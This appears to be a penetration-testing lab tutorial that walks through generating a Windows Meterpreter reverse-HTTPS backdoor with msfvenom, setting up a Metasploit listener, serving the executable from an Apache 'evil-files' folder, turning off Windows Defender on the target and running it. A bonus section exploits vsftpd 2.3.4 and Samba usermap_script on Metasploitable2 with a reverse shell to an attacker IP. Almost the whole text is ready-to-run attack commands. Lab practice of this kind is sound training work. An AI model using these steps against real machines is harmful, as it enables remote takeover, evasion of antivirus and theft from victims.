

##  PART 1: Creating a Backdoor with msfvenom

### Step 1: Understand the Tool
```bash
msfvenom --help
```

### Step 2: List Available Payloads
```bash
msfvenom --list payloads
```

Example payload:
```
windows/x64/meterpreter_reverse_https
```

### Step 3: Check Payload Options
```bash
msfvenom -p windows/x64/meterpreter_reverse_https --list-options
```

### Step 4: Generate the Backdoor Executable
```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.233.128 LPORT=8080 -f exe -o rev_https_8080.exe
```

### Explanation:
- `-p`: Payload
- `LHOST`: Kali (attacker) IP
- `LPORT`: Listening port
- `-f exe`: Format as Windows executable
- `-o`: Output filename

---

##  PART 2: Setting Up Listener in Metasploit

### Step 1: Launch Metasploit
```bash
msfconsole
```

### Step 2: Use Multi/Handler Module
```bash
use exploit/multi/handler
```

### Step 3: Set the Payload
```bash
set PAYLOAD windows/x64/meterpreter_reverse_https
```

### Step 4: Set Listener IP & Port
```bash
set LHOST 192.168.233.128
set LPORT 8080
```

### Step 5: Verify and Run
```bash
show options
exploit
```

> Metasploit will now wait for a connection from the target.

---

##  PART 3: Delivering the Backdoor to Windows VM

### Step 1: Move Backdoor to Apache Directory
```bash
mkdir /var/www/html/evil-files
cp rev_https_8080.exe /var/www/html/evil-files/
```

### Step 2: Start Apache Server
```bash
sudo service apache2 start
```

### Step 3: Download the Backdoor on Windows
- Open browser on Windows VM
- Navigate to: `http://192.168.233.128/evil-files/rev_https_8080.exe`

### Step 4: Disable Windows Defender
1. Search for "Virus & Threat Protection"
2. Click "Manage settings"
3. Turn OFF real-time protection, cloud protection, etc.

### Step 5: Execute the Backdoor
- Locate `.exe` in Downloads folder
- Double-click to execute

---

##  PART 4: Exploiting the Backdoor with Metasploit

Once the Windows machine executes the backdoor:

### Step 1: View Active Sessions
```bash
sessions
```

### Step 2: Interact with Session
```bash
sessions -i [session_number]
```

### Step 3: Run Meterpreter Commands
```bash
sysinfo
getuid
shell
```

---

##  BONUS: Exploiting Metasploitable2 Services

### Example 1: vsftpd 2.3.4 Backdoor
```bash
nmap -sV 192.168.75.135
```
Look for:
```
21/tcp open  vsftpd 2.3.4
```

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 192.168.75.135
exploit
```

### Example 2: Exploiting Samba (SMB)
```bash
use exploit/multi/samba/usermap_script
set RHOST 192.168.75.135
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.233.128
set LPORT 5555
exploit
```

---

##  Summary Table

| Tool/Service       | Purpose                          |
|--------------------|----------------------------------|
| msfvenom           | Create backdoor payload          |
| apache2            | Serve payload to victim          |
| multi/handler      | Receive reverse shell            |
| meterpreter        | Control compromised Windows host |
| nmap               | Scan and identify services       |
| Metasploitable2    | Test system with known vulns     |

---
